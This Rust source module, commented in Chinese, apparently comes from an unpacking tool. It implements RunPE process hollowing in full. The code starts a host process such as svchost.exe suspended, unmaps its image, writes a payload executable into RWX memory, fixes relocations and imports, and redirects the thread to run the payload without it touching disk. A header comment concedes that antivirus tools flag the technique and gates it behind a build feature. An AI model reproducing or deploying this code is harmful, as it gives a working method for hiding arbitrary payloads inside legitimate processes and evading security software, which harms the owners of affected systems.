//! 内存EXE执行（RunPE 进程挖坑）
//!
//! 把内存中的 EXE 映像直接跑起来，不落盘。做法：以挂起态创建宿主进程 → 卸载其映像 →
//! 在其地址空间写入载荷映像 → 修正重定位/导入表 → 将线程入口指向载荷入口 → 恢复执行。
//!
//!  安全提示：进程挖坑/注入是杀软首要启发式指标。本模块**仅在 `--features runpe` 时编译**，
//! 默认构建不含这些代码（产物保持免误报）。启用后请知悉可能被杀软标记为木马/黑客工具。
//!
//! 实现为自包含裸 FFI（`extern "system"` + 手写结构体），避免受 windows crate 版本 API 摆布。

#![cfg(all(windows, feature = "runpe"))]

use crate::Result;

// ---------- PE 常量 ----------
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_REL_BASED_HIGHLOW: u16 = 3;
const IMAGE_REL_BASED_DIR64: u16 = 10;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const CREATE_SUSPENDED: u32 = 0x4;

// ---------- 裸 FFI ----------
#[repr(C)]
struct StartupInfoW {
    cb: u32,
    _pad0: u32,
    lp_reserved: *mut u16,
    lp_desktop: *mut u16,
    lp_title: *mut u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    _pad1: u32,
    lp_reserved2: *mut u8,
    h_std_input: isize,
    h_std_output: isize,
    h_std_error: isize,
}
impl Default for StartupInfoW {
    fn default() -> Self {
        unsafe { std::mem::zeroed() }
    }
}

#[repr(C)]
#[derive(Default)]
struct ProcessInformation {
    h_process: isize,
    h_thread: isize,
    dw_process_id: u32,
    dw_thread_id: u32,
}

// x64 CONTEXT：1232 字节、16 字节对齐。此处以字节缓冲承载，按偏移取字段，避免结构体布局出错。
#[repr(C, align(16))]
struct ContextBuf([u8; 1232]);
impl ContextBuf {
    fn new() -> Self {
        unsafe { std::mem::zeroed() }
    }
    fn set_flags(&mut self, v: u32) {
        self.0[0x30..0x34].copy_from_slice(&v.to_le_bytes());
    }
    fn set_rcx(&mut self, v: u64) {
        self.0[0x80..0x88].copy_from_slice(&v.to_le_bytes());
    }
    #[cfg(target_arch = "x86")]
    fn set_eax(&mut self, v: u32) {
        self.0[0xB0..0xB4].copy_from_slice(&v.to_le_bytes());
    } // x86 CONTEXT.Eax
}

#[link(name = "kernel32")]
extern "system" {
    fn CreateProcessW(
        app: *const u16,
        cmd: *mut u16,
        pa: *mut u8,
        ta: *mut u8,
        inherit: i32,
        flags: u32,
        env: *mut u8,
        cwd: *const u16,
        si: *mut StartupInfoW,
        pi: *mut ProcessInformation,
    ) -> i32;
    fn GetThreadContext(thread: isize, ctx: *mut ContextBuf) -> i32;
    fn SetThreadContext(thread: isize, ctx: *const ContextBuf) -> i32;
    fn ResumeThread(thread: isize) -> u32;
    fn TerminateProcess(process: isize, code: u32) -> i32;
    fn CloseHandle(obj: isize) -> i32;
    fn VirtualAllocEx(
        process: isize,
        addr: *const u8,
        size: usize,
        atype: u32,
        protect: u32,
    ) -> *mut u8;
    fn WriteProcessMemory(
        process: isize,
        base: *mut u8,
        buf: *const u8,
        size: usize,
        written: *mut usize,
    ) -> i32;
    fn LoadLibraryA(name: *const u8) -> isize;
    fn GetProcAddress(module: isize, name: *const u8) -> usize;
}
#[link(name = "ntdll")]
extern "system" {
    fn NtUnmapViewOfSection(process: isize, base: *mut u8) -> i32;
}

// ---------- 小端读取 ----------
fn u16_at(b: &[u8], o: usize) -> u16 {
    u16::from_le_bytes(b[o..o + 2].try_into().unwrap())
}
fn u32_at(b: &[u8], o: usize) -> u32 {
    u32::from_le_bytes(b[o..o + 4].try_into().unwrap())
}
fn u64_at(b: &[u8], o: usize) -> u64 {
    u64::from_le_bytes(b[o..o + 8].try_into().unwrap())
}

struct Pe<'a> {
    image_base: u64,
    size_of_image: u32,
    entry_rva: u32,
    headers_size: u32,
    sections: Vec<(u32, u32, u32, u32)>,
    data_dir: Vec<(u32, u32)>,
    raw: &'a [u8],
}

fn parse_pe(raw: &[u8]) -> Result<Pe<'_>> {
    if raw.len() < 0x40 || u16_at(raw, 0) != IMAGE_DOS_SIGNATURE {
        return Err(crate::SecUnzipError::Unpacking(
            "载荷不是有效 PE（缺少 MZ）".into(),
        ));
    }
    let e_lfanew = u32_at(raw, 0x3C) as usize;
    if e_lfanew + 0x18 > raw.len() || u32_at(raw, e_lfanew) != IMAGE_NT_SIGNATURE {
        return Err(crate::SecUnzipError::Unpacking(
            "载荷不是有效 PE（缺少 PE 头）".into(),
        ));
    }
    let file_header = e_lfanew + 4;
    let num_sections = u16_at(raw, file_header + 2) as usize;
    let opt_size = u16_at(raw, file_header + 16) as usize;
    let opt = file_header + 20;
    let magic = u16_at(raw, opt);
    let is_pe32plus = magic == 0x20B;
    if !is_pe32plus && magic != 0x10B {
        return Err(crate::SecUnzipError::Unpacking("未知可选头格式".into()));
    }
    let entry_rva = u32_at(raw, opt + 16);
    let image_base = if is_pe32plus {
        u64_at(raw, opt + 24)
    } else {
        u32_at(raw, opt + 28) as u64
    };
    let size_of_image = u32_at(raw, opt + 56);
    let headers_size = u32_at(raw, opt + 60);
    let num_dd = u32_at(raw, opt + if is_pe32plus { 108 } else { 92 }) as usize;
    let dd_off = opt + if is_pe32plus { 112 } else { 96 };
    let mut data_dir = Vec::new();
    for i in 0..num_dd {
        let o = dd_off + i * 8;
        if o + 8 <= raw.len() {
            data_dir.push((u32_at(raw, o), u32_at(raw, o + 4)));
        }
    }
    let mut sections = Vec::new();
    let sec_off = opt + opt_size;
    for i in 0..num_sections {
        let s = sec_off + i * 40;
        if s + 40 > raw.len() {
            break;
        }
        sections.push((
            u32_at(raw, s + 12),
            u32_at(raw, s + 8),
            u32_at(raw, s + 20),
            u32_at(raw, s + 16),
        ));
    }
    Ok(Pe {
        image_base,
        size_of_image,
        entry_rva,
        headers_size,
        sections,
        data_dir,
        raw,
    })
}

fn read_cstr(buf: &[u8], off: usize) -> Vec<u8> {
    let mut v = Vec::new();
    let mut i = off;
    while i < buf.len() && buf[i] != 0 {
        v.push(buf[i]);
        i += 1;
    }
    v.push(0);
    v
}

/// 在内存中执行 EXE（RunPE）。`payload` 为完整 PE 映像；`host` 为宿主程序路径（如 C:\Windows\System32\svchost.exe）。
pub fn run_pe_memory(payload: &[u8], host: &str) -> Result<()> {
    let pe = parse_pe(payload)?;

    let mut si = StartupInfoW::default();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    let mut pi = ProcessInformation::default();
    let mut host_w: Vec<u16> = host.encode_utf16().chain(std::iter::once(0)).collect();
    let created = unsafe {
        CreateProcessW(
            std::ptr::null(),
            host_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if created == 0 {
        return Err(crate::SecUnzipError::Unpacking("创建宿主进程失败".into()));
    }
    let (hproc, hthread) = (pi.h_process, pi.h_thread);

    let result = (|| -> Result<()> {
        let mut ctx = ContextBuf::new();
        unsafe {
            ctx.set_flags(0x10001F); // CONTEXT_ALL
            if GetThreadContext(hthread, &mut ctx) == 0 {
                return Err(crate::SecUnzipError::Unpacking(
                    "GetThreadContext 失败".into(),
                ));
            }
        }
        // 卸载宿主原映像（失败可容忍）
        unsafe {
            NtUnmapViewOfSection(hproc, pe.image_base as *mut u8);
        }

        let remote = unsafe {
            VirtualAllocEx(
                hproc,
                pe.image_base as *const u8,
                pe.size_of_image as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if remote.is_null() {
            return Err(crate::SecUnzipError::Unpacking(
                "VirtualAllocEx 失败".into(),
            ));
        }
        let remote_base = remote as u64;

        // 构建本地映像（头 + 各节区）
        let mut local = vec![0u8; pe.size_of_image as usize];
        let hdr_len = (pe.headers_size as usize)
            .min(payload.len())
            .min(local.len());
        local[..hdr_len].copy_from_slice(&payload[..hdr_len]);
        for &(va, _vsz, raw_ptr, raw_sz) in &pe.sections {
            let (dst, src) = (va as usize, raw_ptr as usize);
            let n = (raw_sz as usize)
                .min(pe.raw.len().saturating_sub(src))
                .min(local.len().saturating_sub(dst));
            if n > 0 {
                local[dst..dst + n].copy_from_slice(&pe.raw[src..src + n]);
            }
        }

        // 重定位
        let delta = remote_base.wrapping_sub(pe.image_base);
        if delta != 0 {
            if let Some(&(reloc_rva, reloc_size)) = pe.data_dir.get(IMAGE_DIRECTORY_ENTRY_BASERELOC)
            {
                let (mut off, end) = (reloc_rva as usize, reloc_rva as usize + reloc_size as usize);
                while off + 8 <= end && off + 8 <= local.len() {
                    let block_rva = u32_at(&local, off) as usize;
                    let block_size = u32_at(&local, off + 4) as usize;
                    if block_size < 8 {
                        break;
                    }
                    for i in 0..(block_size - 8) / 2 {
                        let e = u16_at(&local, off + 8 + i * 2);
                        let (typ, target) = (e >> 12, block_rva + (e & 0x0FFF) as usize);
                        if typ == IMAGE_REL_BASED_ABSOLUTE {
                            continue;
                        }
                        if typ == IMAGE_REL_BASED_DIR64 && target + 8 <= local.len() {
                            let v = u64_at(&local, target).wrapping_add(delta);
                            local[target..target + 8].copy_from_slice(&v.to_le_bytes());
                        } else if typ == IMAGE_REL_BASED_HIGHLOW && target + 4 <= local.len() {
                            let v = u32_at(&local, target).wrapping_add(delta as u32);
                            local[target..target + 4].copy_from_slice(&v.to_le_bytes());
                        }
                    }
                    off += block_size;
                }
            }
        }

        // 导入表（本进程解析系统 DLL，跨进程同基址，直接写 IAT）
        if let Some(&(imp_rva, _)) = pe.data_dir.get(IMAGE_DIRECTORY_ENTRY_IMPORT) {
            let mut desc = imp_rva as usize;
            while desc + 20 <= local.len() {
                let (name_rva, oft, iat) = (
                    u32_at(&local, desc + 12) as usize,
                    u32_at(&local, desc) as usize,
                    u32_at(&local, desc + 16) as usize,
                );
                if name_rva == 0 {
                    break;
                }
                let dll = read_cstr(&local, name_rva);
                let hmod = unsafe { LoadLibraryA(dll.as_ptr()) };
                if hmod != 0 {
                    let (mut ts, mut td) = (if oft != 0 { oft } else { iat }, iat);
                    while ts + 8 <= local.len() && td + 8 <= local.len() {
                        let entry = u64_at(&local, ts);
                        if entry == 0 {
                            break;
                        }
                        let addr = if entry & (1u64 << 63) != 0 {
                            unsafe { GetProcAddress(hmod, (entry & 0xFFFF) as usize as *const u8) }
                        } else {
                            let fname = read_cstr(&local, entry as usize + 2);
                            unsafe { GetProcAddress(hmod, fname.as_ptr()) }
                        };
                        if addr != 0 {
                            local[td..td + 8].copy_from_slice(&(addr as u64).to_le_bytes());
                        }
                        ts += 8;
                        td += 8;
                    }
                }
                desc += 20;
            }
        }

        // 写入目标进程
        unsafe {
            if WriteProcessMemory(
                hproc,
                remote,
                local.as_ptr(),
                local.len(),
                std::ptr::null_mut(),
            ) == 0
            {
                return Err(crate::SecUnzipError::Unpacking(
                    "WriteProcessMemory 失败".into(),
                ));
            }
        }

        // 线程入口指向载荷入口
        let entry = remote_base.wrapping_add(pe.entry_rva as u64);
        #[cfg(target_arch = "x86_64")]
        ctx.set_rcx(entry);
        #[cfg(target_arch = "x86")]
        ctx.set_eax(entry as u32);
        unsafe {
            if SetThreadContext(hthread, &ctx) == 0 {
                return Err(crate::SecUnzipError::Unpacking(
                    "SetThreadContext 失败".into(),
                ));
            }
            ResumeThread(hthread);
        }
        Ok(())
    })();

    if result.is_err() {
        unsafe {
            TerminateProcess(hproc, 1);
        }
    }
    unsafe {
        CloseHandle(hthread);
        CloseHandle(hproc);
    }
    result
}
